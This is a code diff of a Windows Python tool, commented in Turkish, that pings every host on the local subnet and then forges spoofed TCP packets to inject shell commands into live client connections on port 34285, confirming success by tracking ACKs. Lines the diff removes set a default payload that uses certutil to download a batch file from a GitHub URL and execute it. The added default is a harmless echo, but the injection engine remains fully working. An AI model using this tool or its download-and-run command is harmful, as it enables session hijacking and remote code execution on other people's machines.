@@ -8,8 +8,8 @@ import time
 import netifaces
 import pydivert
 import aioping
+
 from scapy.all import IP, TCP, Raw, send
-from scapy.all import ARP, Ether, srp
 
 
 # =========================
@@ -32,9 +32,15 @@ def get_default_gateway():
     gws = netifaces.gateways()
     return gws['default'][netifaces.AF_INET][0]
 
+def get_network_base_ip():
+    own_ip = get_own_ip()
+    parts = own_ip.split('.')
+    base_ip = '.'.join(parts[:3])  # örn: 192.168.2
+    return base_ip
+
 
 # =========================
-# Discovery (ICMP + ARP)
+# Discovery (ICMP)
 # =========================
 
 async def ping_host_icmp(ip):
@@ -59,33 +65,14 @@ def sweep_icmp(ip_list):
         print(f"{status} {ip} (icmp)")
     return alive
 
-def sweep_arp(network_cidr):
-    print("\n[2] ARP taraması başlıyor...")
-    answered, _ = srp(
-        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network_cidr),
-        timeout=2,
-        verbose=False
-    )
-    alive = []
-    for _, received in answered:
-        print(f"[+] {received.psrc} - {received.hwsrc} (arp)")
-        alive.append(received.psrc)
-    return alive
-
 
 # =========================
-# Injection (flow-tracking + ACK-doğrulama + adaptif retry)
+# Injection (ACK verified)
 # =========================
 
 def inject_with_capture(target_ip, server_ip, server_port, command,
                         timeout=30, max_attempts_per_flow=8,
                         micro_retries=3, micro_gap=0.02, ack_wait=1.5):
-    """
-    - seq = SON inbound ack_num (client’in serverdan beklediği seq)
-    - ack = SON inbound (seq_num + len(payload_inbound))
-    - gönderimden sonra inbound ACK’de expected_ack = seq + len(payload_out) görülene kadar bekle
-      görülmezse yeni inbound snapshot geldiğinde tekrar dene (max_attempts_per_flow)
-    """
     packet_filter = f"tcp and (ip.DstAddr == {target_ip} or ip.SrcAddr == {target_ip})"
     q = queue.Queue(maxsize=4000)
     stop_evt = threading.Event()
@@ -99,11 +86,9 @@ def inject_with_capture(target_ip, server_ip, server_port, command,
                 except queue.Full:
                     pass
         except Exception:
-            pass  # w kapanınca normal
+            pass
 
-    # flow state
-    # key=(target_ip, client_port)
-    flows = {}  # { key: {last_ack_num, last_seq_plus_len, attempts, injected, port_confirmed, pending: [ {expected_ack, expire_at, used_seq} ] } }
+    flows = {}
     packet_seen = False
 
     def ensure_flow(cp):
@@ -115,7 +100,7 @@ def inject_with_capture(target_ip, server_ip, server_port, command,
                 "attempts": 0,
                 "injected": False,
                 "port_confirmed": False,
-                "pending": [],  # beklenen ack listesi
+                "pending": [],
             }
         return flows[key]
 
@@ -136,7 +121,6 @@ def inject_with_capture(target_ip, server_ip, server_port, command,
                 if now - start_time >= timeout:
                     break
 
-                # pending girişlerini süresi dolanları temizle
                 for st in list(flows.values()):
                     st["pending"] = [p for p in st["pending"] if p["expire_at"] > now]
 
@@ -154,7 +138,6 @@ def inject_with_capture(target_ip, server_ip, server_port, command,
                         pass
                     continue
 
-                # INBOUND (client -> server): ACK snapshot + başarı teyidi
                 if pkt.is_inbound and pkt.src_addr == target_ip:
                     packet_seen = True
                     client_port = pkt.src_port
@@ -164,7 +147,6 @@ def inject_with_capture(target_ip, server_ip, server_port, command,
                     st["last_ack_num"] = pkt.tcp.ack_num
                     st["last_seq_plus_len"] = (pkt.tcp.seq_num or 0) + in_len
 
-                    # başarı teyidi: herhangi pending expected_ack karşılandı mı?
                     if st["pending"]:
                         cur_ack = pkt.tcp.ack_num or 0
                         satisfied = [p for p in st["pending"] if cur_ack >= p["expected_ack"]]
@@ -172,8 +154,7 @@ def inject_with_capture(target_ip, server_ip, server_port, command,
                             st["injected"] = True
                             st["pending"].clear()
                             print(f"[✓ ACK ok] {target_ip}:{client_port} ack={cur_ack} (command accepted)")
-                            # akış doğrulandıktan sonra daha fazla iş yapmayalım (forward devam)
-                # OUTBOUND (server -> client): port doğrula ve gerekiyorsa dene
+
                 if pkt.is_outbound and pkt.dst_addr == target_ip:
                     packet_seen = True
                     if pkt.src_port == server_port:
@@ -181,7 +162,6 @@ def inject_with_capture(target_ip, server_ip, server_port, command,
                         st = ensure_flow(client_port)
                         st["port_confirmed"] = True
 
-                        # şartlar uygunsa ve henüz injected değilse ve deneme limiti aşılmadıysa
                         if (st["last_ack_num"] is not None and
                             st["last_seq_plus_len"] is not None and
                             st["port_confirmed"] and
@@ -193,18 +173,14 @@ def inject_with_capture(target_ip, server_ip, server_port, command,
 
                             fake = (
                                 IP(src=server_ip, dst=target_ip) /
-                                TCP(
-                                    sport=server_port,
-                                    dport=client_port,
-                                    flags="PA",
-                                    seq=seq,
-                                    ack=ack
-                                ) /
+                                TCP(sport=server_port, dport=client_port, flags="PA", seq=seq, ack=ack) /
                                 Raw(load=payload_out)
                             )
 
+                            # Fix checksums
+                            fake = fake.__class__(bytes(fake))
+
                             st["attempts"] += 1
-                            # mikrogönderimler
                             for _ in range(micro_retries):
                                 send(fake, verbose=0)
                                 time.sleep(micro_gap)
@@ -217,13 +193,11 @@ def inject_with_capture(target_ip, server_ip, server_port, command,
                             })
                             print(f"[→ try {st['attempts']}] {target_ip}:{client_port} seq={seq} ack={ack} expect_ack={expected_ack} ← {command}")
 
-                # forward
                 try:
                     w.send(pkt)
                 except Exception:
                     pass
 
-            # kapanış
             stop_evt.set()
             t.join(timeout=1.0)
 
@@ -264,20 +238,18 @@ def run_multi_targets(targets, server_ip, server_port, command, timeout=30, max_
 # =========================
 
 def main():
-    parser = argparse.ArgumentParser(description="Auto ICMP+ARP Discovery + Flow-Tracked TCP Injection (ACK-verified)")
-    parser.add_argument("--base-ip", default="192.168.1", help="IP bloğu (örn 192.168.1)")
+    parser = argparse.ArgumentParser(description="Auto-subnet ICMP Discovery + TCP ACK Injection (no npcap)")
+    parser.add_argument("--base-ip", default=get_network_base_ip(), help="IP bloğu (örn 192.168.1)")
     parser.add_argument("--start", type=int, default=1, help="Başlangıç host")
     parser.add_argument("--end", type=int, default=254, help="Bitiş host")
-    parser.add_argument("--server-port", type=int, default=34285, help="Sunucu TCP portu (değiştirmeden)")
-    parser.add_argument("--command", default='cmd /k certutil -urlcache -split -f https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/nettt.bat nettt.bat && nettt.bat', help="Enjekte edilecek komut")
-    parser.add_argument("--timeout", type=int, default=30, help="Hedef başına süre (s)")
+    parser.add_argument("--server-port", type=int, default=34285, help="Sunucu TCP portu")
+    parser.add_argument("--command", default='cmd /k echo Hello from Injected Shell', help="Enjekte edilecek komut")
+    parser.add_argument("--timeout", type=int, default=30, help="Hedef başına süre (saniye)")
     parser.add_argument("--max-threads", type=int, default=5, help="Paralel hedef sayısı")
-    parser.add_argument("--no-icmp", action="store_true", help="ICMP taramasını atla")
-    parser.add_argument("--no-arp", action="store_true", help="ARP taramasını atla")
     args = parser.parse_args()
 
     if platform.system().lower() != "windows":
-        print("[-] Bu araç Windows (Admin) üzerinde stabil çalışır.")
+        print("[-] Bu araç sadece Windows üzerinde çalışır.")
         return
 
     own_ip = get_own_ip()
@@ -290,17 +262,9 @@ def main():
     ip_range = [f"{args.base_ip}.{i}" for i in range(args.start, args.end + 1)]
     ip_range = [ip for ip in ip_range if ip not in excluded and not ip.startswith("169.254.")]
 
-    alive_icmp = []
-    if not args.no_icmp:
-        alive_icmp = sweep_icmp(ip_range)
+    alive_icmp = sweep_icmp(ip_range)
 
-    alive_arp = []
-    if not args.no_arp:
-        network_cidr = f"{args.base_ip}.0/24"
-        alive_arp = sweep_arp(network_cidr)
-        alive_arp = [ip for ip in alive_arp if ip in ip_range]
-
-    targets = sorted(set(alive_icmp + alive_arp) - excluded)
+    targets = sorted(set(alive_icmp) - excluded)
     if not targets:
         print("[!] Hiç hedef bulunamadı.")
         return
@@ -318,7 +282,6 @@ def main():
     )
 
     print("\n[✓] Tüm işlemler tamamlandı.")
-
 
 if __name__ == "__main__":
     main()
